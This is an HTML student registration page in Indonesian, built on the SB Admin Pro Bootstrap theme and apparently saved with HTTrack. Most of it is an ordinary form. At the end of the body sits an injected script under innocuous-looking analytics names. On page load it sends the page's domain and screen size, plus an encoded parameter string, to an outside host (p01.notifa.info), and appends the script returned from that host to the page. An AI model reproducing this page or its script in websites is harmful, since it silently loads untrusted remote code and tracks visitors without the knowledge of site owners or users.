<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <meta name="description" content />
    <meta name="author" content />
    <title>Dashboard - SB Admin Pro</title>
    <link href="css/styles.css" rel="stylesheet" />
    <link href="https://cdn.datatables.net/1.10.20/css/dataTables.bootstrap4.min.css" rel="stylesheet"
        crossorigin="anonymous" />
    <link href="https://cdn.jsdelivr.net/npm/daterangepicker/daterangepicker.css" rel="stylesheet"
        crossorigin="anonymous" />
    <link rel="icon" type="image/x-icon" href="assets/img/favicon.png" />
    <script data-search-pseudo-elements defer
        src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/js/all.min.js" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/feather-icons/4.27.0/feather.min.js" crossorigin="anonymous">
    </script>
</head>

<body class="bg-primary">
    <div id="layoutAuthentication">
        <div id="layoutAuthentication_content">
            <main>
                <div class="container">
                    <div class="row justify-content-center">
                        <div class="col-xl-5 col-lg-6 col-md-8 col-sm-11">
                            <!-- Social login form-->
                            <div class="card my-5">
                                <div class="card-body p-5 text-center">
                                    <div class="h3 font-weight-light mb-3">Register</div>
                                </div>
                                <div class="card-body p-5">
                                    <!-- Login form-->
                                    <form>
                                        <!-- Form Group (email address)-->
                                        <div class="form-group">
                                            <label class="text-gray-600 small" for="emailExample">Nama Lengkap</label>
                                            <input class="form-control form-control-solid py-4" type="text" placeholder
                                                aria-label="Email Address" aria-describedby="emailExample" />
                                        </div>
                                        <!-- Form Group (password)-->
                                        <div class="form-group">
                                            <label class="text-gray-600 small" for="passwordExample">Kelas</label>
                                            <input class="form-control form-control-solid py-4" type="text"
                                                placeholder aria-label="text" aria-describedby="passwordExample" />
                                        </div>
                                        <div class="form-group">
                                            <label class="text-gray-600 small" for="passwordExample">NISN</label>
                                            <input class="form-control form-control-solid py-4" type="text"
                                                placeholder aria-label="text" aria-describedby="passwordExample" />
                                        </div>
                                        <div class="form-group">
                                            <label class="text-gray-600 small" for="passwordExample">Password</label>
                                            <input class="form-control form-control-solid py-4" type="password"
                                                placeholder aria-label="Password" aria-describedby="passwordExample" />
                                        </div>
                                        <div class="form-group d-flex align-items-center justify-content-between mb-0">
                                            <a class="btn btn-primary" href="index-2.html">Daftar</a>
                                        </div>
                                    </form>
                                </div>
                                <hr class="my-0" />
                                <div class="card-body px-5 py-4">
                                    <div class="small text-center">
                                        Sudah punya akun?
                                        <a href="/login">Login</a>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </main>
        </div>
        <div id="layoutAuthentication_footer">
            <footer class="footer mt-auto footer-dark">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-md-6 small"> &#xA9; </div>
                        <div class="col-md-6 text-md-right small">
                            <a href="#!"></a>
                            &#xB7;
                            <a href="#"></a>
                        </div>
                    </div>
                </div>
            </footer>
        </div>
    </div>
    <script src="../../code.jquery.com/jquery-3.5.1.min.js" crossorigin="anonymous"></script>
    <script src="../../stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.bundle.min.js" crossorigin="anonymous">
    </script>
    <script src="js/scripts.js"></script>

    <script src="js/sb-customizer.js"></script>
    <sb-customizer project="sb-admin-pro"></sb-customizer>
    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function () {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
                    "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXw3twVeD7vVgf9Xc7u1J73zbGJYaZW4xWo%2fHOlozsGX7%2bV0lgkNr%2fYY8FrbUgxh8DII%2fkazv6%2fQHxvOVByc5VpvtJAvbOJqv0zVV1kwVQOPWGBwa6aMg1ddbC7Phl2mTv0lCFKmzhdKPR7ucwXqh0TEuEt6mWEIGXucn8AYko3uiayPl3WX0V9rc3Bvkzzsijh1ZiRzHCT%2fM%2f8wrZtnO1zKzIVKKFVf2gOXLk8U6NxZZ9YM9mEFBxKUzR4OabETWNIPcdnkxmgkdI6ytuKOkq1aRXIU2C%2bagFDFp0aQdbrqFHDsE4QXTbz71O9IkTOkkEi5TPFDjrCczMU%2ffCpM8I3ZHr8pjfUOCBgKDyIVO%2fPVdMMDB10CLcKcol%2bHjzrOzLT90JX9lUIbeGsZrnxwmjAFcmcu31HsVnIez8AgJCziSwo0GlU9VOTyeYJt%2fXCJIEuT%2fy2aI86S4VLS0bsjpWikAkf1s41u7NelDKDd0cp8hPmnIWOIAFjZBal6iqR%2fdoK%2bFhFHdlfjSNIcwJqB4L58jjzDJWy6wa" +
                    "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen
                    .height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function () {});
        };

    </script>
</body>

<!-- Mirrored from themes.startbootstrap.com/sb-admin-pro/auth-login-social.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 17 Aug 2020 22:15:09 GMT -->

</html>
